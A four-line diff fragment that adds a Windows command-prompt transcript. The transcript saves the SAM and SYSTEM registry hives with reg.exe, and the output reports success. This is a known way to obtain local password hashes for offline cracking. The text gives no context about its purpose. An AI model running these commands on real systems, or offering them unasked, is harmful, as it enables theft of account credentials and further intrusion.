@@ -1,0 +1,4 @@
+C:\>reg.exe save HKLM\SAM sam
+The operation completed successfully
+C:\>reg.exe save HKLM\SYSTEM sys
+The operation completed successfully
